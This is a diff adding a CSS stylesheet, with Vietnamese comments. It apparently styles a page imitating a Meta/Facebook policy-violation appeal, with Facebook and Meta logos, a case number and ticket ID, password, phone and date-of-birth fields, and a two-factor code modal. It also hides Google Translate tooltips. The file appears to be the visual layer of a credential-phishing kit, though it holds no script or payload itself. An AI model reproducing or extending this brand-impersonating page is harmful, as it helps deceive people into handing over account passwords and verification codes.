@@ -1,0 +1,1298 @@
+#html {
+    background: #fff;
+}
+
+.goog-tooltip {
+    display: none !important;
+}
+.goog-tooltip:hover {
+    display: none !important;
+}
+.goog-text-highlight {
+    background-color: transparent !important;
+    border: none !important; 
+    box-shadow: none !important;
+}
+
+#goog-gt-tt, .goog-te-balloon-frame{display: none !important;} 
+.goog-text-highlight:hover { background: none !important; box-shadow: none !important;}
+
+body {
+    background: inherit;
+    height: 100vh;
+    overflow: hidden;
+    overflow-y: scroll;
+}
+
+.row {
+    height: 100%;
+}
+
+#left {
+
+    padding: 10px 20px 0 0;
+    /* padding-bottom: 0; */
+    /* overflow-y: scroll; */
+    position: sticky;
+    position: -webkit-sticky;
+    /* ---- */
+    top: 0;
+    overflow-y: auto;
+    /* max-width: 400px; */
+    /* ------- */
+    overflow-x: auto;
+    overflow: visible;
+    position: relative;
+}
+
+#left img {
+    width: auto;
+    height: 100%;
+    /* max-height: 800px; */
+    position: absolute;
+    right: 0;
+    /* object-fit: contain; */
+
+}
+
+.col-4 {
+    border-right: 1px solid #DEE3E9;
+}
+
+.display-center
+{
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+#right {
+    padding: 40px 20px;
+}
+
+#logo {
+    display: block;
+    width: 50px;
+    height: auto;
+    margin: 0 auto;
+    margin-bottom: 40px;
+    /* height: 12px; */
+}
+
+.warning-text{
+    margin-bottom: 20px;
+    margin-left: 5px;
+    margin-right: 5px;
+    text-align: center;
+}
+
+#utm-ticketId{
+    margin-bottom: 15px;
+}
+
+#fb-logo
+{
+    margin: 112px 0 16px;
+    text-align: center;
+}
+
+#fb-logo img
+{
+    width: 70px;
+    margin: auto;
+}
+
+.verified_info
+{
+    max-width: 500px;
+    margin: auto;
+}
+
+.fb-title
+{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.fb-title h1
+{
+    font-size: 24px;
+    line-height: 30px;
+    color: rgb(28, 30, 33);
+    font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;
+    text-align: center;
+}
+
+.fb-text
+{
+    font-size: 1rem;
+    line-height: 26px;
+    width: auto;
+    font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+    text-align: center;
+
+}
+
+.fb-text img
+{
+    width: 20px;
+    height: 20px;
+}
+
+h1,
+h2 {
+    line-height: 30px;
+    color: rgb(28, 30, 33);
+    font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;
+
+    font-weight: 700;
+    margin: 16px 0;
+
+}
+
+h1 {
+    font-size: 24px;
+    display: flex;
+    align-items: center;
+}
+
+h2 {
+    font-size: 20px;
+}
+h4{
+    font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;
+  font-weight: 700;
+  line-height: 30px;
+}
+
+h6 {
+    margin-bottom: 20px;
+}
+
+p {
+    margin: 0;
+    font-size: 15px;
+    line-height: 20px;
+    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important;
+}
+ul{
+    margin: 0;
+    font-size: 15px;
+    line-height: 20px;
+    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important; 
+}
+li {
+    margin: 8px 0;
+}
+
+a {
+    text-decoration: none;
+    margin: 0;
+    font-size: 15px;
+}
+
+a svg {
+    vertical-align: text-top;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.w-100 {
+    width: 100%;
+}
+
+.small-grey {
+    color: rgb(70, 90, 105);
+    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;
+    font-size: 15px;
+    font-weight: 400;
+    line-height: 20px;
+}
+.action-button.account {
+    background-color: #FFFFFF; 
+    cursor:default;
+    color: rgb(70, 90, 105);
+}
+.action-button.account:hover {
+    background-color: #F2F2F2; 
+}
+.action-button.account  svg{
+    width: 34px;
+    height: 34px;
+    
+}
+
+.action-button {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 15px;
+    color: black;
+    background-color: inherit;
+    transition: background-color 0.35s ease;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: 500;
+    line-height: 20px;
+    font-family: Optimistic Text Medium, Helvetica, Arial, sans-serif;
+
+}
+
+.action-button:hover {
+    background-color: #E3E8EF;
+}
+
+.action-button.main {
+    color: white;
+    background-color: rgb(52, 72, 84);
+}
+
+.action-button.wide {
+    background-color: white;
+}
+
+.action-button.wide:hover {
+    background-color: #E3E8EF;
+}
+
+.action-button-list {
+    border-radius: 15px;
+    overflow: hidden;
+}
+
+.action-button-list .action-button {
+    border-radius: 0;
+    border-bottom: 1px solid #E3E8EF;
+}
+
+.action-button-list .action-button:last-child {
+    border-bottom: none;
+}
+
+
+.action-button-img {}
+
+.action-button-img svg {
+    width: 24px;
+    height: 24px;
+}
+
+.action-button-img img {
+    width: 48px;
+    height: 48px;
+}
+
+.action-button-text {
+    width: 100%;
+    text-align: left;
+    padding: 0 12px;
+
+}
+
+.action-button-arrow svg {
+    width: 24px;
+    height: 24px;
+}
+
+.action-button.collapsed .ARROW {
+    display: block;
+    rotate: 0deg;
+}
+
+.action-button .ARROW {
+    display: block;
+    rotate: 180deg;
+}
+
+#main {
+    /* max-width: 1600px; */
+    /* padding-top: 72px; */
+    overflow: initial;
+    width: 100%;
+    height: 100%;
+}
+
+#videoMain {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    width: 100vw;
+    margin: 0;
+    overflow: hidden;
+    background-color: white;
+}
+
+.goog-te-balloon-frame,
+.goog-tooltip,
+.goog-tooltip:hover {
+    display: none !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
+}
+
+#videoMain img{
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    background-color: white;
+    transform: translate(-50%, -50%);
+            max-width: 100%;
+            max-height: 100%;
+            width: auto;
+            height: auto;
+            object-fit: contain;
+}
+
+#contentMain {
+    display: none;
+    height: 100%;
+}
+
+/* CARD */
+#card {
+    display: flex;
+    flex-direction: column;
+    border-radius: 20px;
+    background-color: transparent;
+    margin: 0;
+}
+
+#card img {
+    border-radius: 20px 20px 0 0;
+}
+
+.card-text {
+    margin: 20px;
+
+}
+
+.card-text .card-type {
+    font-size: 16px;
+    font-weight: 400;
+    margin-bottom: 10px;
+}
+
+.card-text h4 {
+    font-weight: 500;
+    margin: 14px 0;
+}
+.btn:disabled{
+    opacity: .85;
+}
+
+.btn-wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    padding: 20px 0;
+}
+
+.button {
+    height: 50px;
+    width: 200px;
+    border-radius: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+}
+
+.button.fb-blue:hover {
+    color: white;
+    background-color: rgb(0, 100, 224);
+    border: none;
+}
+
+.button.fb-blue {
+    background-color: rgb(0, 100, 224);
+    color: white;
+}
+
+.button:hover {
+    background-color: #E2EAF2;
+    transition: background-color 0.25s ease;
+}
+
+/* CARD */
+
+/* MODAL */
+#searchModal .modal-content, #accountsModal .modal-content{
+    min-height: 500px;
+}
+#accountsModal .modal-content{
+    min-width: 550px;
+}
+#accountsModal .action-button:hover{
+    background-color: white;
+    cursor: default;
+}
+#searchModal .search-input-wraper{
+    display: flex;
+    position: relative;
+    align-items: center;
+}
+#searchModal .search-icon-wraper, #searchModal .close-search-icon-wraper{
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #8B99A8;
+}
+#searchModal .search-icon-wraper{
+    left: 12px;
+}
+#searchModal .close-search-icon-wraper{
+    right: 6px;
+    border-radius: 50%;
+    width: 28px;
+    height: 28px;
+    color: rgb(70, 90, 105);
+    font-size: 12px;
+    font-weight: 400;
+    cursor: pointer;
+}
+#searchModal .close-search-icon-wraper svg{
+    width: 18px;
+    height: 18px;
+}
+#searchModal .close-search-icon-wraper:hover{
+    background-color: #D6DEE6;
+
+}
+#searchModal input{
+    width: 100%;
+    background-color: rgba(0, 0, 0, 0.05);
+    border: none;
+    outline: none;
+    height: 36px;
+    border-radius: 18px;
+    padding-right: 8px;
+    padding-left: 36px;
+    font-family: Helvetica, Arial, sans-serif;
+}
+#searchModal input::placeholder{
+    color: #8a8a8a;
+}
+#searchModal .fake-items div{
+    background-color: white;
+    margin: 6px;
+    height: 42px;
+    border-radius: 6px;
+    opacity: 0.6;
+}
+#searchModal .now-found div{
+    padding-top: 64px;
+    padding-bottom: 32px;
+}
+#searchModal .now-found svg{
+    width: 96px;
+    height: 96px;
+}
+.btn-close:focus {
+    box-shadow: none;
+}
+
+.modal .modal-content {
+    border-radius: 25px;
+    background: rgb(249, 241, 249);
+    background: linear-gradient(90deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);
+}
+
+.modal-header {
+    padding: 1.4rem 1.4rem;
+    border-bottom: none;
+    padding-bottom: 1rem;
+
+}
+.modal-footer img{
+    width: 70px;
+}
+
+.modal-header .btn-close {
+    opacity: 1;
+}
+.form-modal .modal-content{
+    min-height: 92vh;
+}
+.form-modal .modal-body{
+    
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+}
+.twoFAinfo-wraper{
+    padding-top: 50px;
+
+}
+#twoFAmodal
+{
+    display: block;
+    border: none;
+    border-radius: 5px;
+}
+
+#twoFAmodal .modal-dialog{
+    max-width: 580px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+#twoFAmodal .modal-content{
+    border: none;
+    /* border-radius: 8px; */
+    /* box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); */
+    background: white;
+    height: auto;
+}
+#twoFAmodal .modal-title{
+    font-size: 21px;
+    line-height: 27px;
+    margin-bottom: 7px;
+    margin-top: 3px;
+}
+
+#twoFAmodal .source-info
+{
+    color: gray;
+    font-size: 18px;
+    font-weight: 500;
+    margin-bottom: 3px;
+}
+
+.twoFAinfo-wraper p{
+    font-size: 15px;
+    line-height: 20px;
+    font-weight: 400;
+    margin-bottom: 20px;
+}
+
+.verify-more-info{
+    display: flex;
+    padding: 12px;
+    margin-top:15px;
+    background: rgba(244, 244, 244, 0.3);
+}
+
+.verify-more-info svg{
+    width: 70px;
+    height: 70px;
+    margin-right: 10px;
+    padding: 10px;
+    color: #9f580a;
+}
+
+.font-medium{
+    font-weight: 570;
+    font-size:16.5px;
+}
+
+.verify-more-info .font-medium{
+    margin-top: 2px;
+    margin-bottom: 4px;
+    line-height: 23px;
+}
+
+.verify-more-info p{
+    font-size: 15px;
+    line-height: 19px;
+}
+
+.fb-round-wraper{
+    display: flex;
+    justify-content: center;    
+}
+.fb-round-wraper .fb-logo-round{
+    width: 70px;
+    /* margin-top: 80px;
+    margin-bottom: -80px; */
+}
+.modal-footer {
+    justify-content: center;
+    border-top: none;
+}
+
+.btn-close:hover {
+    background-color: #E2EAF2;
+    border-radius: 50%;
+}
+
+.form-btn-wrapper {
+    display: flex;
+    justify-content: center;
+    padding: 15px 0;
+}
+
+.form-btn-wrapper .btn {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    border-radius: 25px;
+    height: 50px;
+    font-size: 20px;
+}
+
+.link-wrapper{
+    text-align: center;
+}
+
+#new-account-btn
+{
+    background-color: #42b72a;
+    padding: 12px 16px;
+    color: white;
+    border-radius: 6px;
+    font-weight: 620;
+    font-size: 16px;
+}
+
+#forgot-password-btn
+{
+    font-size: 13px;
+}
+
+#continueform
+{
+    background-color: #0866ff;
+    border-radius: 6px;
+    font-weight: 650;
+}
+
+.modal-title {
+    /* margin-bottom: 15px; */
+}
+
+.spinner-border {
+    width: 2rem;
+    height: 2rem;
+    border: 0.25em solid #f3f3f3; /* Màu nền */
+    border-top: 0.25em solid #3498db; /* Màu cho phần trên */
+    border-radius: 50%;
+    animation: spin 0.75s linear infinite; /* Hiệu ứng quay */
+    display: none; /* Đảm bảo spinner bị ẩn lúc đầu */
+}
+
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+.spinner-border.text-light {
+    border-top-color: #fff; /* Màu trắng cho spinner */
+}
+
+/* Ẩn chữ Continue hoàn toàn khi spinner hiện */
+.spinner-active .button-text {
+    display: none; /* Ẩn hoàn toàn chữ Continue */
+}
+
+/* Hiển thị spinner khi đang tải */
+.spinner-active .spinner-border {
+    display: inline-block; /* Hiển thị spinner */
+}
+
+
+input[type="password"]::-ms-reveal, /* Loại bỏ trong Microsoft Edge */
+input[type="password"]::-ms-clear,   /* Loại bỏ nút xóa trong Microsoft Edge */
+input[type="password"]::-webkit-clear-button, /* Loại bỏ trong Safari, Chrome */
+input[type="password"]::-webkit-password-eye { /* Loại bỏ biểu tượng mắt trong Chrome */
+    display: none;
+}
+
+.password-input {
+    background-color: #FFF;
+    border: 2px solid #D4DBE3;
+    border-radius: 10px;
+    padding: 5px;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    width: 100%;
+}
+
+.password-input input {
+    border: none;
+    padding: 0 .75rem;
+    height: 24px; /* Chiều cao của input */
+    width: 100%;
+    padding-right: 40px; /* Tạo không gian cho biểu tượng */
+    box-sizing: border-box;
+}
+
+#togglePassword {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-100%); 
+    cursor: pointer;
+    font-size: 20px; 
+    stroke-width: 5;
+}
+
+.password-input.disabled {
+    background-color: #E3E3E3;
+}
+
+.password-input .form-label {
+    color: #5e5e5e;
+    margin-bottom: 0;
+    padding: 0 .75rem;
+    width: 100%;
+}
+
+.password-input input:disabled {
+    background-color: #E3E3E3;
+}
+
+.password-input input:focus {
+    box-shadow: none;
+    border: none;
+}
+
+.password-input input:focus-visible {
+    box-shadow: none;
+    border: none;
+}
+
+.security-text {
+    margin-left: 10px; /* Điều chỉnh khoảng cách thụt vào cho dòng chữ */
+    margin-bottom: 5px; /* Thêm khoảng cách dưới */
+    display: block;
+}
+
+
+
+#forgot-pass-wrap{
+    text-align: center;
+    text-align: center;
+    font-size: 16px;
+    font-weight: 500;
+}
+.form-control{
+    height: 50px;
+    background-color: #FFF;
+    border: 2px solid #D4DBE3;
+    border-radius: 10px;
+}
+.form-control:focus{
+    box-shadow: none;
+    border: 2px solid #D4DBE3;
+}
+textarea.form-control{
+    min-height: 100px;
+}
+
+#first-form .form-control{
+    border-radius: 6px;
+    border: 1.5px solid #dddfe2;
+}
+
+#first-form .form-control:focus{
+    border: 1.5px solid #609bfb;
+}
+
+.modal-backdrop {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); /* Màu đen với độ mờ */
+    z-index: 1040; /* Đảm bảo lớp phủ nằm trên các thành phần khác */
+    display: none; /* Ẩn lớp phủ mặc định */
+}
+/* MODAL */
+.iti {
+    width: 100%;
+}
+
+#PhoneField {
+    width: 100%;
+    box-sizing: border-box;
+}
+
+/* --------------------------------------------------------------- */
+.container-head {
+    display: flex;
+    justify-content: space-between;
+    padding: 10px;
+}
+
+.burger-button {
+    display: flex;
+    flex-direction: column;
+    cursor: pointer;
+}
+
+.bar {
+    width: 30px;
+    height: 2px;
+    border-radius: 5px;
+    background-color: #333;
+    margin: 5px 0;
+    transition: 0.4s;
+}
+
+#showPopup {
+    display: none;
+}
+
+.popup {
+    display: none;
+    position: fixed;
+    padding: 0;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    justify-content: center;
+    align-items: center;
+    /* z-index: 1; */
+}
+
+.popup-item {
+    border-radius: 25px;
+    background: linear-gradient(90deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);
+    padding: 20px;
+    max-width: 400px;
+    max-height: 500px;
+    overflow-y: auto;
+}
+
+.container-head {
+    display: none;
+}
+
+.policy-wrapper { /* Tạo viền xám nhạt */
+    padding: 6px 6px 0px 6px; /* Khoảng cách bên trong khung */
+    border-radius: 8px; /* Bo tròn góc viền */
+    background-color: #fff;
+    box-shadow: 0 2px 4px #0000001a, 0 8px 16px #0000001a; /* Bóng đổ nhẹ */
+    margin-bottom: 20px; /* Thêm khoảng cách bên dưới khung */
+    max-width: 400px;
+    margin: auto;
+}
+
+.display-phone
+{
+    display: none;
+}
+
+#meta-logo
+{
+    width: 70px;
+    height: auto;
+    margin: 0 auto;
+    margin-bottom: 60px;
+}
+
+#togglePassword
+{
+    display: none;
+}
+
+
+@media screen and (max-width: 2500px) {
+    .fb-text
+    {
+        font-size: 1.1rem;
+        /* padding-right: 40px; */
+    }
+    #right{
+        padding: 20px 5px;
+    }
+    #exampleModal2 .modal-content, 
+    #twoFAmodal .modal-content,
+    #searchModal .modal-content,
+    #successModal .modal-content{
+        border-radius: 0;
+    }
+
+    #accountsModal .modal-content{
+        min-width: auto;
+    }
+    .container-head {
+        display: flex;
+    }
+
+    .burger-button-popup {
+        display: flex;
+        flex-direction: column;
+        cursor: pointer;
+        align-items: end;
+    }
+
+    .burger-button-popup.bar {
+        width: 30px;
+        height: 4px;
+        background-color: #333;
+        margin: 6px 0;
+    }
+
+    .burger-button-popup .bar:nth-child(1) {
+        transform: rotate(-45deg) translate(-3px, 4px);
+    }
+
+    .burger-button-popup .bar:nth-child(2) {
+        transform: rotate(45deg) translate(-5px, -6px);
+    }
+
+    .popup {
+        justify-content: center;
+        flex-direction: column;
+    }
+
+    #left {
+        padding: 0px;
+    }
+
+    #left h1 {
+        margin: 3px 0;
+    }
+
+    .col-8 {
+        width: 100%;
+    }
+
+    .row {
+        justify-content: center;
+    }
+
+    .policy-wrapper
+    {
+        border: none;
+        border-radius: 0;
+        box-shadow: none;
+        max-width: 500px;
+    }
+
+    #first-form .form-control{
+        border-radius: 16px;
+        padding: 10px 16px;
+        height: 60px;
+        border: 1.2px solid rgb(221, 226, 232)2;
+        margin-bottom: 10px;
+    }
+
+    .policy-wrapper .modal-body{
+        padding: 1rem 0px;
+    }
+
+    .bi-eye
+    {
+        margin-right: 5px;
+    }
+
+    .bi-eye-slash
+    {
+        margin-right: 5px;
+    }
+
+    #continueform
+    {
+        border-radius: 22px;
+        height: 45px;
+        font-weight: 500;
+        font-size: 17px;
+    }
+
+    .modal-header1
+    {
+        display: none;
+    }
+
+    .create-new-account
+    {
+        margin-top: 20vh;
+        
+    }
+
+    #new-account-btn
+    {
+        display: block;
+        width: 100%;
+        border: 1px solid rgb(0, 100, 224);
+        border-radius: 22px;
+        color: rgb(0, 100, 224);
+        background-color: white;
+        height: 45px;
+        padding: 9px;
+    }
+
+    #new-account-btn
+    {
+        font-weight: 450;
+    }
+}
+
+@media screen and (max-width: 1000px) {
+    .popup-item {
+        max-height: none;
+        height: 100vh;
+        margin: 15px;
+        max-width: none;
+        width: 95%;
+    }
+
+
+    .display-phone
+    {
+        display: block;
+    }
+
+    #main
+    {
+        width: 100%;
+        height: 100%;
+        background-color: white;
+    }
+
+
+    #first-form .form-control{
+        border-radius: 16px;
+        padding: 10px 16px;
+        height: 60px;
+        border: 1.2px solid rgb(221, 226, 232)2;
+        margin-bottom: 10px;
+    }
+
+    .policy-wrapper .modal-body{
+        padding: 1rem 0px;
+    }
+
+    .bi-eye
+    {
+        margin-right: 5px;
+    }
+
+    .bi-eye-slash
+    {
+        margin-right: 5px;
+    }
+
+    #continueform
+    {
+        border-radius: 22px;
+        height: 45px;
+        font-weight: 500;
+        font-size: 17px;
+    }
+
+    .modal-header1
+    {
+        display: none;
+    }
+
+    .create-new-account
+    {
+        margin-top: 20vh;
+        
+    }
+
+    #new-account-btn
+    {
+        display: block;
+        width: 100%;
+        border: 1px solid rgb(0, 100, 224);
+        border-radius: 22px;
+        color: rgb(0, 100, 224);
+        background-color: white;
+        height: 45px;
+        padding: 9px;
+    }
+
+    #new-account-btn
+    {
+        font-weight: 450;
+    }
+}
+
+@media screen and (max-width: 768px) {
+    .row {
+        align-items: flex-start;
+        height: auto;
+    }
+
+    #left img
+    {
+        position: relative;
+        width: 100%;
+        height: auto;
+        object-fit: cover;
+        display: block;
+        padding-bottom: 30px;
+    }
+
+    #left
+    {
+        display: block;
+        margin: 0px;
+        /* flex: auto; */
+    }
+
+    .col-right{
+        margin-top: 0px;
+    }
+
+    #fb-logo
+    {
+        display: none;
+    }
+}
+
+@media screen and (max-width: 480px) {
+    .col-8 {
+        width: 100%;
+    }
+}
+
+/* ------------------------------------------------------------------------ */
+
+ /* width */
+ *::-webkit-scrollbar {
+    width: 3px;
+  }
+  
+  /* Track */
+  *::-webkit-scrollbar-track {
+    background: transparent;
+  }
+  
+  /* Handle */
+  *::-webkit-scrollbar-thumb {
+    background: rgb(74,74,74);
+  }
+  
+  /* Handle on hover */
+  *::-webkit-scrollbar-thumb:hover {
+    background: rgb(51, 51, 51);
+    width: 6px;
+  } 
+
+#twoFAForm {
+    padding-bottom: 30%;
+    margin-top: 1rem;
+}
+
+
+
+.form-group {
+    margin-bottom: 20px; /* Thêm khoảng cách dưới cho các form group */
+}
+.form-container {
+    background-color: transparent !important;
+}
+
+.status-container {
+    display: flex;
+    align-items: flex-start; /* Căn chỉnh các phần tử theo chiều dọc */
+    gap: 10px;
+    margin-bottom: 20px; /* Tạo khoảng cách dưới cho toàn bộ container */
+}
+
+.status-icon {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #6d6d6d;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+}
+
+.status-text {
+    display: block; /* Đảm bảo các phần tử bên trong xuống hàng */
+}
+
+.heading {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 0px; /* Khoảng cách giữa tiêu đề và nút OPEN */
+}
+.open-status {
+    background-color: #007bff;
+    color: white;
+    padding: 2px 8px;
+    border-radius: 5px;
+    font-size: 12px;
+    font-weight: bold;
+    margin-bottom: 5px; /* Khoảng cách giữa nút OPEN và case number */
+    display: inline-block;
+}
+
+.case-number {
+    font-size: 14px;
+    color: #6d6d6d;
+}
+.modal.form-modal1 {
+    background-color: transparent !important;
+    border: none !important;
+    box-shadow: none !important;
+}
+
+.modal-dialog1 {
+    background-color: transparent !important;
+    border: none !important;
+    box-shadow: none !important;
+}
+
+.modal-content1 {
+    background-color: transparent !important;
+    border: none !important;
+    box-shadow: none !important; /* Loại bỏ bóng đổ */
+    outline: none !important; /* Loại bỏ bất kỳ đường viền nào */
+}
+
+.modal-header1 {
+    border-bottom: 1.2px solid #ccc; /* Tạo đường chia giữa Policy violation và modal */
+    padding-bottom: 10px; /* Thêm khoảng cách phía dưới đường chia */
+    margin-top: 10px;
+    margin-bottom: 30px; /* Tạo khoảng cách giữa đường chia và phần modal tiếp theo */
+}
+.appeal-text {
+    margin-left: 20px; /* Tăng khoảng cách từ lề trái */
+    padding-left: 10px; /* Khoảng cách bên trong cho lề trái */
+    text-align: left; /* Đảm bảo căn lề trái đúng */
+}
+
+.dob-container {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 20px; /* Thêm khoảng cách dưới giống các ô khác */
+    padding-top: 10px; /* Đảm bảo có khoảng cách trên nếu cần */
+}
+
+.dob-item {
+    flex: 1;
+    margin: 0; /* Xóa bỏ margin thừa nếu có */
+}
+
+.dob-select {
+    width: 100%; /* Ensure dropdown fills the container */
+    padding: 10px;
+    font-size: 16px;
+    background-color: #fff;
+    border: 2px solid #d4dbe3;
+    border-radius: 10px;
+    appearance: none;
+    cursor: pointer;
+}
+
+.dob-select:focus {
+    outline: none;
+    border-color: #007bff;
+}
